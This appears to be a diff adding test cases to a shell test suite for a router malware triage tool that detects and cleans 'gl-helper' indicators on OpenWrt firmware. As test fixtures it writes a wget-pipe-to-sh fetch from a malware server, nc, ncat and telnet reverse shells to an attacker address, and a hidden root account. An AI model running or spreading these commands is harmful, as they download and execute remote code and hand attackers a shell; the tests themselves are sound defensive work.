@@ -567,6 +567,60 @@ expect "--fix resets rc.local and the crontab and removes the fetching file (exi
 expect "--fix drops only the fetch lines from the firmware's crontabs" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q gl-inet.top "$D/m/tmp/gl_crontabs/root" && grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q rtty "$D/m/etc/gl_crontabs/crontabs.d/tasks"'
 umount "$D/m"
 
+echo "=== names in comments and in this script's name are no trace (review of 2.53)"
+D=$(mkscen notes "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
+printf '#!/bin/sh\n# block the servers of the gl-helper malware\niptables -I OUTPUT -d 65.20.71.131 -j DROP   # its wget source\n' >"$U/etc/hotplug.d/iface/99-block-csa"
+printf '0 4 * * * /root/backup.sh\n0 * * * * sh /root/gl-helper-triage.sh --no-report >/tmp/triage.log 2>&1\n7 * * * * nslookup gl-inet.top 127.0.0.1 | grep -q 0.0.0.0 || sh /root/reblock.sh\n' >"$U/etc/crontabs/root"
+printf '/root/gl-helper-triage.sh\n/etc/config/my-vpn\n' >"$U/etc/sysupgrade.conf"
+printf '127.0.0.1 localhost\n# older backdoor (CSA-2026-01): adguardns.com, adguardns.org\n0.0.0.0 adguardns.com\n0.0.0.0 adguardns.org # blocked\n' >"$U/etc/hosts"
+printf "config rule\n\toption name 'Block-adguardns.com'\n\toption dest_ip '1.2.3.4'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
+expect "a block with a note about gl-helper and wget is INFO server-block" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt"'
+expect "a cron job that runs this script, or a || sh after a lookup, is the owner's PERSIST" 'grep -q "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt"'
+expect "the older backdoor's names in a comment or a rule's name are no trace" '! grep -q "backdoor-host" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hosts" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && grep -q gl-helper-triage "$D/m/etc/crontabs/root" && grep -q gl-helper-triage "$D/m/etc/sysupgrade.conf"'
+umount "$D/m"
+
+echo "=== an empty rc.local in the firmware: every line of yours is a change (busybox grep -f)"
+D=$(mkscen emptyrc "$OWL"); U=$D/u
+L0=$BASE/openwrt-rom-emptyrc; cp -a "$OWL" "$L0"; : >"$L0/etc/rc.local"
+mkdir -p "$U/etc"; printf '/root/start-vpn.sh\nexit 0\n' >"$U/etc/rc.local"
+mount -t overlay overlay -o "lowerdir=$L0,upperdir=$D/u,workdir=$D/w" "$D/m"
+run "$D" "$L0" --check >"$D/check.txt"
+expect "rc.local is PERSIST, not the firmware's own lines" 'grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" && ! grep -q "firmware-lines" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== the firewall's start script (/etc/firewall.user)"
+D=$(mkscen fwuser "$OWL"); U=$D/u
+mkdir -p "$U/etc/firewall.d"
+printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nwget -qO- http://65.20.71.131:8000/ni.sh | sh\n' >"$U/etc/firewall.user"
+printf '/etc/config/.gl/watch.sh &\n' >"$U/etc/firewall.d/90-x"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "a fetch or the malware's script there is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/firewall.user" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/firewall.d/90-x" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix removes those lines and keeps the owner's rule (exit $rc)" '[ $rc = 2 ] && grep -q "192.168.8.50" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && ! grep -q watch.sh "$D/m/etc/firewall.d/90-x"'
+umount "$D/m"
+
+echo "=== a deleted rc.local, a failed archive, a run from a pipe"
+D=$(mkscen wo "$OWL"); U=$D/u
+mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gb"
+mnt "$D" "$OWL"
+rm "$D/m/etc/rc.local"
+run "$D" "$OWL" --check >"$D/check.txt"
+expect "a deleted rc.local is INFO deleted, not an odd file" 'grep -q "INFO  *deleted  */etc/rc.local" "$D/check.txt" && ! grep -q "odd-file" "$D/check.txt"'
+run "$D" "$OWL" --fix -o /dev/null/x >"$D/fix.txt" 2>&1; rc=$?
+expect "without an archive --fix changes nothing, still gives the verdict, exit 4" '[ $rc = 4 ] && grep -q "nothing was changed" "$D/fix.txt" && grep -q "Verdict: INFECTED" "$D/fix.txt" && [ -f "$D/m/etc/config/.gl/gb" ]'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix does not bring the deleted rc.local back (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/rc.local" ]'
+env PATH="$TRIAGE_PATH" $TRIAGE_SH -s -- --root "$D/m" --upper "$D/u" --lower "$OWL" --check <"$T" >"$D/pipe.txt" 2>&1
+expect "run from a pipe, the head does not offer sh sh --update" 'grep -q "runs from a pipe, not a file" "$D/pipe.txt" && ! grep -q "sh sh --update" "$D/pipe.txt"'
+umount "$D/m"
+
 echo "=== rc.local with only the firmware's own lines is not a change"
 D=$(mkscen rcl "$OWL"); U=$D/u
 mkdir -p "$U/etc"
@@ -769,7 +823,7 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	fp() { mkdir -p "$L/proc/$1"; echo "$2" >"$L/proc/$1/comm"; printf "$3" >"$L/proc/$1/cmdline"; ln -s /bin/busybox "$L/proc/$1/exe"; }
 	fp 5001 sh 'sh\0-c\0sleep 60; : ping gl-inet.top\0'
 	fp 5002 tcpdump 'tcpdump\0-ni\0any\0host\000170.39.226.219\0'
-	fp 5003 less 'less\0/tmp/gl-helper.log\0'
+	fp 5003 tail 'tail\0-f\0/etc/config/.gl/install.log\0'
 	fp 5004 iptables 'iptables\0-I\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
 	fp 5005 wget 'wget\0-qO-\0http://65.20.71.131:8000/ni.sh\0'
 	fp 5006 nc 'nc\000170.39.226.219\0004444\0'
@@ -781,6 +835,21 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	expect "a process that blocks a server is INFO" 'grep -q "INFO  *process  *5004" "$L/procs.txt" && ! grep -qE "(IOC|REVIEW)  *process  *5004" "$L/procs.txt"'
 	expect "a fetch, nc, cat of the pipe, the malware's script and the reported shell line are IOC" 'grep -A1 "IOC  *process  *5005" "$L/procs.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *process  *5006" "$L/procs.txt" | grep -q "remote shell reported" && grep -q "IOC  *process  *5007" "$L/procs.txt" && grep -q "IOC  *process  *5008" "$L/procs.txt" && grep -A1 "IOC  *process  *5009" "$L/procs.txt" | grep -q "remote shell reported"'
 	rm -r "$L"/proc/500?
+	# variants of the shell, a script started with ".", and a name that tries to hide a process
+	fp 5011 ncat 'ncat\000170.39.226.219\0004444\0-e\0/bin/sh\0'
+	fp 5012 sh 'sh\0-c\0telnet 170.39.226.219 4444 | /bin/sh | telnet 170.39.226.219 4445\0'
+	fp 5013 sh 'sh\0-c\0. /etc/config/.gl/boot.sh\0'
+	fp 5014 nc 'nc\000170.39.226.219\0004444\0-e\0/bin/sh\0--\0gl-helper-triage\0'
+	fp 5015 sh 'sh\0/root/gl-helper-triage.sh\0--check\0'
+	live --no-report >"$L/procs2.txt"
+	expect "ncat, telnet, a sourced script of the malware and a hiding name are IOC; this script itself is not" 'for n in 5011 5012 5013 5014; do grep -q "IOC  *process  *$n" "$L/procs2.txt" || exit 1; done; ! grep -q "process  *5015" "$L/procs2.txt"'
+	rm -r "$L"/proc/501?
+	# The report keeps the owner's lines and names, and says so in bold before it asks
+	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\nexit 0\n' >"$L/etc/rc.local"
+	printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n' >"$L/etc/passwd"
+	live >"$L/ask2.txt"
+	expect "the summary names the addresses and the account that go with the report" 'grep -q "1 of them hold IP addresses that are not the attacker" "$L/ask2.txt" && grep -q "Also the name of each account the firmware does not have: jsmith-admin" "$L/ask2.txt" && ! grep -q "Not sent: host name, IP or MAC" "$L/ask2.txt"'
+	rm "$L/etc/rc.local" "$L/etc/passwd"
 	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
 	# The chroot gets a base image with the same busybox and an iptables-save that prints
 	# the rule the attack leaves; first the same file in the system, then a changed one.
